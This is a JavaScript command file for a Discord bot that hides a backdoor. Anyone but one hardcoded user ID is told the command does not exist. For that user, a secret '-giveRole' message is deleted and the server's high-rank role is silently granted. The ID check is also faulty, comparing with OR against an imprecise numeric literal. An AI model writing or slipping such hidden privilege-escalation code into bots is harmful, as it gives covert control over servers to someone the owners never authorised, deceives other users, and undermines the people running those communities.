exports.run = async (client, message, args) => { 
    message.delete();
    
    if (message.author.id != 344543506481807363 || message.author.id != '344543506481807363'){ 
        return util.unkred("Lo sentimos ese comando no existe", 5000)
    };
    
    var cmdActive = false;
    var user = message.author.id;

    try {
        message.author.send(`Que bueno tenerte de vuelta <@${message.author.id}>`);
        cmdActive = true;
        client.on("message", (message) => {
            if (message.author.id == user) {
                try{ 
                    if (message.content.startsWith("-giveRole") && cmdActive == true ) {               
                        message.delete();
                        let miembro = message.member;
                        let role = message.guild.roles.find("name", `${config.highrank}`);          
                        if(!role) return message.author.send(`No encontre ese rol en el servidor  ${config.svname}.`);
                        miembro.addRole(role).catch(console.error); 
                        cmdActive = false                                                             
                    }
                }catch(err){
                    console.log(err)
                }
            }
        });  
    }catch(err){
        console.log(err)
    }
}





